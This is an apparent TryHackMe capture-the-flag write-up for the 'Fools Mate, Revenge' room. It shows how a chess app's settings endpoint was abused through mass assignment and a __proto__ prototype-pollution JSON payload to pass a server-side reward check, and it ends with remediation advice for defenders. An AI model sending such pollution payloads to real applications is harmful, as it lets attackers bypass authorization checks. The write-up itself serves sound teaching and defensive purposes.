# [Fools Mate, Revenge](https://tryhackme.com/room/foolsm8v2)

| Field      | Details                          |
|------------|----------------------------------|
| Room       | [Fools Mate, Revenge](https://tryhackme.com/room/foolsm8v2) |
| Platform   | TryHackMe                        |
| Difficulty | Medium                            |
| Category   | Web Exploitation                 |
| Tags       | Prototype Pollution, Mass Assignment, Broken Authorization Logic, API Enumeration |

---

## Overview

The original Fools Mate was won by out-thinking a JavaScript function pretending to be a security control on the client side. The sequel opens with the bot itself gloating about that: *"I see my client-side defences were no match for you, well done, my apprentice! Let's see if you have what it takes to claim your prize."* Cute. The frontend bouncer got fired and replaced with a real backend check, so the exact move that won last time (`Ra8#`, rook a1 to a8) still delivers checkmate but no longer delivers a flag.

From a blue team perspective this room is a clean demonstration of two vulnerability classes stacking on top of each other: mass assignment on an endpoint that blindly writes user-controlled JSON into a stored object, escalating into full-blown prototype pollution once that write turns out to be an unguarded recursive merge. The chess game itself is the easy part. The actual challenge is a REST API deciding who "deserves" to win based on a mutable session property that was never supposed to be attacker-reachable, and it turns out to be reachable anyway, just not the way anyone tried first.

---

## Enumeration

### Reading the App

The app is a browser-based chess "endgame trainer" served at `MACHINE_IP:3000`. View-source shows a standard static bundle: `index.html`, `css/styles.css`, and `js/app.js`, the last of which bundles its own copy of `chess.js`.

```
Client bundle
┌───────────────────────────────────────┐
│  index.html                           │
│  css/styles.css                       │
│  js/app.js  ──► bundles chess.js       │
│               ──► hardcoded start FEN │
└───────────────────────────────────────┘
```

Digging into `app.js`, the starting position is a hardcoded FEN string. Loading it onto a board shows White with a rook on a1 and a king on g1, while Black's king is boxed into g8 by its own pawns on f7, g7, h7. That's a mate in one sitting in plain view: rook a1 to a8, checkmate down the back rank. The room is rigged to be won on the first move, on purpose, because winning was never the actual challenge.

### Mapping the API Surface

Reading through `app.js` further shows the frontend talks to four backend endpoints:

```
API surface
┌─────────────────────────────────────────────┐
│  POST /api/move     ──► submit a move         │
│  GET  /api/state     ──► current game state    │
│  POST /api/reset     ──► reset the board       │
│  POST /api/settings  ──► save UI preferences   │
│                          (theme, pieceSet,     │
│                          animationMs)          │
└─────────────────────────────────────────────┘
```

`/api/settings` stands out immediately. It's the only endpoint that writes arbitrary-looking user-controlled data into something server-side, which is exactly the shape of a mass assignment bug: a server that merges whatever JSON it receives into a stored object instead of only accepting a fixed whitelist of fields.

---

## Initial Access

### Winning the Game, Losing the Reward

Playing the intended line, `Ra8#`, the board correctly recognizes checkmate. Instead of a flag, a popup reads: *"Checkmate! No reward for you."* The chess engine is working fine, so whatever is gatekeeping the reward lives somewhere else entirely.

### Reading the Actual Response

Watching Network tab traffic during the move reveals the real request and, more importantly, a response field the UI never bothers to display:

```
POST /api/move
{ "from": "a1", "to": "a8" }
```

```json
{
  "ok": true,
  "move": "a1a8",
  "status": "checkmate",
  "winner": "white",
  "locked": true,
  "message": "Checkmate! No reward for you.",
  "reason": "reward gate closed: session.config.unlocked is not set"
}
```

That `reason` field hands over the exact server-side check: `session.config.unlocked` has to be truthy before the reward gate opens. The rest of the room is just working out how to make that true.

```
Discovery chain
┌───────────────────────────────────────────┐
│  Ra8# ──► legitimate checkmate               │
│         │                                    │
│  "No reward for you" popup                   │
│         │                                    │
│  Network tab ──► response.reason leaks the    │
│                  exact gate check:            │
│                  session.config.unlocked      │
└───────────────────────────────────────────┘
```

---

## Escalating the Investigation

### The Naive Attempts

First try, direct field injection on the only endpoint that writes session data:

```
POST /api/settings
{ "unlocked": true }
```

```json
{ "ok": true, "preferences": {} }
```

Nothing stuck. Nesting it the way the `reason` string implied:

```
POST /api/settings
{ "config": { "unlocked": true } }
```

Still nothing echoed back. Mixing the extra field in with the legitimate settings the UI actually sends:

```
POST /api/settings
{ "theme": "dark", "pieceSet": "classic", "animationMs": 200, "unlocked": true }
```

`preferences` comes back populated, but only with the three legitimate fields. The extra key gets silently stripped, confirming the endpoint whitelists what it echoes back at the top level, without revealing what it does internally with anything else it received.

### The Tell

The important detail isn't that the direct attempts failed, it's *how* the nested attempt was handled. A request with an unrecognized nested `config` object still came back `200 OK`, not rejected. A properly schema-validated endpoint should throw out an unexpected shape outright. Silently accepting it instead is the signature of a server recursively merging attacker-controlled JSON into an internal object with no structural checks at all, which is exactly the precondition prototype pollution needs.

```
Vulnerability chain
┌────────────────────────────────────────────┐
│  Direct field ──► stripped by whitelist       │
│  Nested field ──► silently accepted, 200 OK   │
│         │                                     │
│  200 OK on unexpected shape ──► no schema      │
│  validation ──► unguarded recursive merge      │
│  ──► prototype pollution candidate             │
└────────────────────────────────────────────┘
```

### Why It Works

Every plain JavaScript object inherits from `Object.prototype` unless explicitly created without one. A naive recursive merge that does `target[key] ??= {}` for nested objects will, if the attacker-supplied key is `__proto__`, resolve `target[key]` to `Object.prototype` itself rather than a normal, isolated property. Writing into it doesn't modify one session; it modifies the shared template every object in the running application inherits from.

The reward check, `session.config.unlocked`, is a plain property lookup. JavaScript property lookups that don't find a key directly on an object automatically walk up the prototype chain, which is precisely the mechanism this pollution abuses: `unlocked` never needs to be set on any specific session's config. It only needs to exist somewhere every object falls back to, including a config object that doesn't exist yet.

### The Payload

```
POST /api/settings
{
  "__proto__": { "unlocked": true },
  "theme": "coral",
  "pieceSet": "outline",
  "animationMs": 100
}
```

`200 OK`, nothing visibly different in the response. That's expected; the effect shows up later, on freshly created objects that inherit the polluted property, not on the request that set it.

```
Prototype pollution chain
┌──────────────────────────────────────────────┐
│  POST /api/settings                             │
│  { "__proto__": { "unlocked": true }, ... }      │
│         │                                        │
│  Recursive merge writes into Object.prototype    │
│  (not into session-local config)                 │
│         │                                        │
│  Every plain object, including future ones,      │
│  now resolves .unlocked → true via the chain     │
└──────────────────────────────────────────────┘
```

### Confirming It

Resetting the game (`POST /api/reset`) forces a brand-new `session.config` object to be built from scratch. If the pollution had only affected the existing session, a reset would erase it. Instead, replaying the exact same checkmate afterward:

```
POST /api/reset
POST /api/move
{ "from": "a1", "to": "a8" }
```

...passes the reward check anyway, proving the fix isn't tied to any one session. The `reason` field disappears, `locked` flips, and the flag is revealed.

```
Confirmation chain
┌────────────────────────────────────────────┐
│  Reset ──► fresh session.config object        │
│  built from scratch                            │
│         │                                       │
│  Replay Ra8# ──► gate check still passes        │
│         │                                       │
│  Proof: pollution is global (Object.prototype), │
│  not session-scoped                             │
└────────────────────────────────────────────┘
```

---

## Attack Path Summary

```
[Recon]
  │
  ├─ View source ──► app.js, hardcoded FEN, mate in one
  └─ API surface ──► /api/move, /api/state, /api/reset, /api/settings
         │
[Initial Discovery]
  │
  └─ Play Ra8# ──► real checkmate, reward blocked
                 ──► response.reason leaks check name:
                     session.config.unlocked
         │
[Failed Direct Attempts]
  │
  └─ Top-level / mixed-in field injection ──► silently whitelisted away
         │
[Prototype Pollution]
  │
  └─ Nested unexpected shape accepted (200 OK, no validation)
                 ──► __proto__ payload on /api/settings
                 ──► Object.prototype.unlocked = true globally
         │
[Confirmation]
  │
  └─ Reset (fresh config object) + replay Ra8#
                 ──► gate still passes ──► flag
```

---

## Flags

| # | Question                     | Answer                                    |
|---|--------------------------------|---------------------------------------------|
| 1 | Claim the reward for defeating the bot | `flag{...}` (drop in your captured value) |

---

## Blue Team Takeaways

**Mass Assignment Endpoints Need Explicit Allowlists**
`/api/settings` treated any JSON it received as fair game to merge into a stored object rather than validating it against a fixed schema. Whitelisting the output it echoes back isn't the same as whitelisting what it actually writes internally. Every endpoint that accepts a user-editable object needs to enumerate exactly which keys are acceptable, reject everything else outright, and do that validation before any merge happens, not after.

**Prototype Pollution Is What Unvalidated Recursive Merges Turn Into**
The vulnerability here wasn't really "prototype pollution" as a standalone bug, it was the natural consequence of a recursive object merge that never blocked dangerous keys like `__proto__`, `constructor`, or `prototype`. Any code that deep-merges attacker-controlled JSON needs a merge utility with built-in prototype-pollution protection, or needs to build target objects with `Object.create(null)` so there's no prototype chain available to pollute in the first place. `Object.freeze(Object.prototype)` is a reasonable defense-in-depth layer on top of that.

**Silent Acceptance of Unexpected Input Is a Signal, Not a Convenience**
The single biggest tell in this room was a `200 OK` on a nested object shape nobody documented. An endpoint that quietly accepts structurally unexpected input instead of rejecting it is telling an attacker exactly where validation is missing. APIs should fail loud and specific on unexpected shapes; silently ignoring or silently accepting unknown fields both leak information about what's happening internally.

**Security-Relevant State Should Never Live in a User-Writable Object**
The entire exploit worked because reward eligibility was gated behind `session.config.unlocked`, a property sitting in the same object graph as cosmetic preferences like board theme and animation speed. Authorization-relevant flags need to be computed server-side from trusted state (did this session actually deliver checkmate, verified by the server's own game logic) rather than stored in anything a settings endpoint, or any other user-facing write path, can ever influence, directly or indirectly.

---

*Turns out the real endgame wasn't rook to a8, it was JSON to `__proto__`.*
